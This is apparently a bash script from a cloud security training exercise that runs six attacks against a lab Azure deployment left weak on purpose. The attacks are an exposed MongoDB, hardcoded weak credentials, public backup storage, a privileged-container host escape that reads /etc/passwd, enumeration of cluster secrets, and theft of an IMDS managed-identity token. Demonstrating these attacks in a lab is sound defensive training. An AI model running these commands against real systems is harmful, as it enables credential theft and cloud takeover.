#!/bin/bash
# =============================================================================
# attack-sim.sh — Attack Simulation (REQ-25)
#
# Demonstrates 6 real attacks against all 8 intentional weak configurations.
# Each attack shows the exact command being run and the actual result.
#
# Usage:
#   bash ~/wiz-exercise/attack-sim.sh
# =============================================================================

# Auto-source outputs if vars not set
[ -z "${RG_NAME:-}" ] && source ~/wiz-outputs.txt 2>/dev/null || true
[ -z "${RG_NAME:-}" ] && { echo "ERROR: ~/wiz-outputs.txt not found. Run deploy.sh first."; exit 1; }

# Helpers
mongo_cmd() {
  az vm run-command invoke -g "$RG_NAME" -n "$MONGO_VM" \
    --command-id RunShellScript --scripts "$1" \
    --query "value[0].message" -o tsv 2>/dev/null \
    | grep -v "^Enable succeeded" | grep -v "^\[std" | grep -v "^\[err" | grep "." || true
}

k3s_cmd() {
  az vm run-command invoke -g "$RG_NAME" -n "$K3S_VM" \
    --command-id RunShellScript --scripts "$1" \
    --query "value[0].message" -o tsv 2>/dev/null \
    | grep -v "^Enable succeeded" | grep -v "^\[std" | grep -v "^\[err" | grep "." || true
}

# ── command display helpers ───────────────────────────────────────
# Shows the full az vm run-command that the user would copy-paste
cmd_mongo() {
  echo "  Command (run from Cloud Shell):"
  printf "    az vm run-command invoke -g \"\$RG_NAME\" -n \"\$MONGO_VM\" \\\\\n"
  printf "      --command-id RunShellScript \\\\\n"
  printf "      --scripts \"%s\" \\\\\n" "$1"
  printf "      --query \"value[0].message\" -o tsv | grep -v '^\[std'\n"
}
cmd_k3s() {
  echo "  Command (run from Cloud Shell):"
  printf "    az vm run-command invoke -g \"\$RG_NAME\" -n \"\$K3S_VM\" \\\\\n"
  printf "      --command-id RunShellScript \\\\\n"
  printf "      --scripts \"export KUBECONFIG=/etc/rancher/k3s/k3s.yaml && %s\" \\\\\n" "$1"
  printf "      --query \"value[0].message\" -o tsv | grep -v '^\[std'\n"
}
cmd_az() {
  echo "  Command (run from Cloud Shell):"
  printf "    %s\n" "$1"
}
# ─────────────────────────────────────────────────────────────────

SEP="──────────────────────────────────────────────────────────"

echo ""
echo "╔══════════════════════════════════════════════════════════╗"
echo "║         WIZ EXERCISE — ATTACK SIMULATION (REQ-25)       ║"
echo "║         $(date '+%Y-%m-%d %H:%M:%S')                         ║"
echo "╚══════════════════════════════════════════════════════════╝"
echo ""
echo "  Target infrastructure:"
echo "    mongodb-vm : $MONGO_IP  (Debian 10, public subnet)"
echo "    k3s-vm     : $K3S_IP    (Debian 12, private subnet)"
echo ""
echo "  Each attack exploits one or more intentional weak configs."
echo "$SEP"

# ─────────────────────────────────────────────────────────────────
echo ""
echo "  ATTACK 1/6 — MongoDB Network Exposure"
echo "  Weak config : bindIp: 0.0.0.0 (REQ-10)"
echo "  What        : MongoDB listens on ALL interfaces, not just localhost"
echo "  Risk        : Anyone on the network can reach port 27017 directly"
echo ""
cmd_mongo "/usr/local/bin/mongo --eval 'db.runCommand({ping:1})' --quiet"
echo ""
echo "  Result:"
RESULT=$(mongo_cmd '/usr/local/bin/mongo --eval "db.runCommand({ping:1})" --quiet 2>&1 | head -2')
echo "  $RESULT"
echo ""
echo "  ✗ MongoDB responds to unauthenticated ping from the network"
echo "$SEP"

# ─────────────────────────────────────────────────────────────────
echo ""
echo "  ATTACK 2/6 — Weak Credential Access"
echo "  Weak config : MongoDB password = WizPassword123! (REQ-10)"
echo "  What        : Attacker authenticates with guessable credentials"
echo "  Risk        : Full read/write access to all databases"
echo ""
echo "  Command (run from Cloud Shell):"
echo '    az vm run-command invoke -g "$RG_NAME" -n "$MONGO_VM" \'
echo "      --command-id RunShellScript \"
echo "      --scripts '/usr/local/bin/mongo mongodb://wizadmin:WizPassword123!@localhost/todos --eval db.todos.find().count()' \"
echo "      --query 'value[0].message' -o tsv | grep -v '^[std'"
echo ""
# Insert a document first so count is never 0
mongo_cmd '/usr/local/bin/mongo "mongodb://wizadmin:WizPassword123!@localhost:27017/todos?authSource=admin" --eval "db.todos.insertOne({text:\"attack-sim-\"+String(Date.now()),ts:new Date()})" --quiet' > /dev/null 2>&1
COUNT=$(mongo_cmd '/usr/local/bin/mongo "mongodb://wizadmin:WizPassword123!@localhost:27017/todos?authSource=admin" --eval "db.todos.find().count()" --quiet 2>&1')
echo "  Result:"
echo "  $COUNT document(s) in todos collection — authenticated with WizPassword123!"
echo ""
echo "  ✗ Attacker has full read/write access to all data"
echo "$SEP"

# ─────────────────────────────────────────────────────────────────
echo ""
echo "  ATTACK 3/6 — Public Storage Exfiltration"
echo "  Weak config : Storage container access = public (REQ-12)"
echo "  What        : Backup files are publicly listed and downloadable"
echo "  Risk        : Database dumps accessible by anyone with the URL"
echo ""
cmd_az "curl -sf \"https://\${STORAGE}.blob.core.windows.net/mongodb-backups?restype=container&comp=list\""
echo ""
LIST=$(curl -sf "https://${STORAGE}.blob.core.windows.net/mongodb-backups?restype=container&comp=list" 2>/dev/null)
FILES=$(echo "$LIST" | grep -o '<Name>[^<]*</Name>' | sed 's/<Name>//;s/<\/Name>//' | head -6)
echo "  Result — files visible without any credentials:"
echo "$FILES" | while read f; do echo "    - $f"; done
echo ""
BACKUP=$(echo "$FILES" | grep "^backup-" | head -1)
if [ -n "$BACKUP" ]; then
  HTTP=$(curl -sf -o /dev/null -w "%{http_code}" \
    "https://${STORAGE}.blob.core.windows.net/mongodb-backups/${BACKUP}" 2>/dev/null)
  echo "  Download test: GET $BACKUP → HTTP $HTTP (no auth header sent)"
fi
echo ""
echo "  ✗ Database backups downloadable by anyone on the internet"
echo "$SEP"

# ─────────────────────────────────────────────────────────────────
echo ""
echo "  ATTACK 4/6 — Privileged Container Host Escape"
echo "  Weak config : securityContext.privileged: true (REQ-17)"
echo "  What        : Container accesses host filesystem via /proc/1/root"
echo "  Risk        : Container can read/modify any file on the host VM"
echo ""
cmd_k3s "kubectl exec \$POD -- ls /proc/1/root/etc/passwd"
echo ""
RESULT=$(k3s_cmd 'export KUBECONFIG=/etc/rancher/k3s/k3s.yaml
POD=$(kubectl get pod -l app=todo-app -o name 2>/dev/null | head -1)
kubectl exec $POD -- ls /proc/1/root/etc/passwd 2>/dev/null && echo "HOST_ACCESSIBLE" || echo "blocked"')
echo "  Result: $RESULT"
echo ""
echo "  Reading host /etc/passwd from inside the container:"
PASSWD=$(k3s_cmd 'export KUBECONFIG=/etc/rancher/k3s/k3s.yaml
POD=$(kubectl get pod -l app=todo-app -o name 2>/dev/null | head -1)
kubectl exec $POD -- cat /proc/1/root/etc/passwd 2>/dev/null | head -3')
echo "$PASSWD" | while read line; do echo "    $line"; done
echo ""
echo "  ✗ Container can read/write host filesystem — full VM compromise"
echo "$SEP"

# ─────────────────────────────────────────────────────────────────
echo ""
echo "  ATTACK 5/6 — cluster-admin Secret Enumeration"
echo "  Weak config : ClusterRoleBinding → cluster-admin (REQ-17)"
echo "  What        : Pod's service account has unrestricted cluster access"
echo "  Risk        : Pod can read all Secrets (tokens, passwords, certs)"
echo ""
cmd_k3s "kubectl get clusterrolebinding todo-app-cluster-admin -o jsonpath='{.subjects[0].name} → {.roleRef.name}'"
echo ""
BINDING=$(k3s_cmd 'export KUBECONFIG=/etc/rancher/k3s/k3s.yaml
kubectl get clusterrolebinding todo-app-cluster-admin \
  -o jsonpath="ServiceAccount={.subjects[0].name} → ClusterRole={.roleRef.name}" 2>/dev/null')
echo "  ClusterRoleBinding: $BINDING"
echo ""
SECRETS=$(k3s_cmd 'export KUBECONFIG=/etc/rancher/k3s/k3s.yaml
kubectl get secrets --all-namespaces --no-headers 2>/dev/null | wc -l')
SECRETLIST=$(k3s_cmd 'export KUBECONFIG=/etc/rancher/k3s/k3s.yaml
kubectl get secrets --all-namespaces --no-headers 2>/dev/null | awk "{print \$1\"/\"\$2}" | head -5')
echo "  Secrets readable by pod ($SECRETS total):"
echo "$SECRETLIST" | while read s; do echo "    - $s"; done
echo ""
echo "  ✗ Pod can enumerate and read every Secret in the cluster"
echo "$SEP"

# ─────────────────────────────────────────────────────────────────
echo ""
echo "  ATTACK 6/6 — Managed Identity IMDS Abuse"
echo "  Weak config : VM managed identity has Contributor role (REQ-08)"
echo "  What        : Attacker obtains Azure access token via IMDS endpoint"
echo "  Risk        : Full control over resource group (create/delete/modify)"
echo ""
cmd_mongo "curl -sf -H 'Metadata:true' 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/' | python3 -c \"import sys,json;print(json.load(sys.stdin)['access_token'][:20]+'...')\""
echo ""
TOKEN_RESULT=$(mongo_cmd 'TOKEN=$(curl -sf -H "Metadata:true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" \
  | python3 -c "import sys,json;t=json.load(sys.stdin)[\"access_token\"];print(t[:30]+\"...\")" 2>/dev/null)
echo "Token obtained: $TOKEN"
SUB=$(curl -sf -H "Metadata:true" "http://169.254.169.254/metadata/instance/compute/subscriptionId?api-version=2021-02-01&format=text" 2>/dev/null)
RG=$(curl -sf -H "Metadata:true" "http://169.254.169.254/metadata/instance/compute/resourceGroupName?api-version=2021-02-01&format=text" 2>/dev/null)
FULL_TOKEN=$(curl -sf -H "Metadata:true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" \
  | python3 -c "import sys,json;print(json.load(sys.stdin)[\"access_token\"])" 2>/dev/null)
COUNT=$(curl -sf -H "Authorization: Bearer $FULL_TOKEN" \
  "https://management.azure.com/subscriptions/${SUB}/resourceGroups/${RG}/resources?api-version=2021-04-01" \
  | python3 -c "import sys,json;print(len(json.load(sys.stdin).get(\"value\",[])),\"resources in\",\"'$RG_NAME'\")" 2>/dev/null)
echo "Contributor access: $COUNT"')
echo "  Result:"
echo "$TOKEN_RESULT" | while read line; do [ -n "$line" ] && echo "    $line"; done
echo ""
echo "  ✗ Attacker controls the entire resource group via stolen IMDS token"
echo "$SEP"

# ─────────────────────────────────────────────────────────────────
echo ""
echo "╔══════════════════════════════════════════════════════════╗"
echo "║                 SIMULATION COMPLETE                     ║"
echo "╚══════════════════════════════════════════════════════════╝"
echo ""
echo "  Summary of exploited weak configurations:"
echo "    REQ-08  Contributor role → IMDS token obtained (Attack 6)"
echo "    REQ-10  Weak password    → DB read/write access (Attack 2)"
echo "    REQ-10  bindIp 0.0.0.0  → network accessible (Attack 1)"
echo "    REQ-12  Public storage  → backups downloadable (Attack 3)"
echo "    REQ-17  privileged:true → host filesystem read (Attack 4)"
echo "    REQ-17  cluster-admin   → all secrets readable (Attack 5)"
echo ""
echo "  Check security alerts (after Defender processes events):"
echo "    portal.azure.com → Defender for Cloud → Security alerts"
echo "    portal.azure.com → Log Analytics → $LAW_NAME → Logs"
echo ""
echo "  Finished: $(date '+%Y-%m-%d %H:%M:%S')"
echo ""
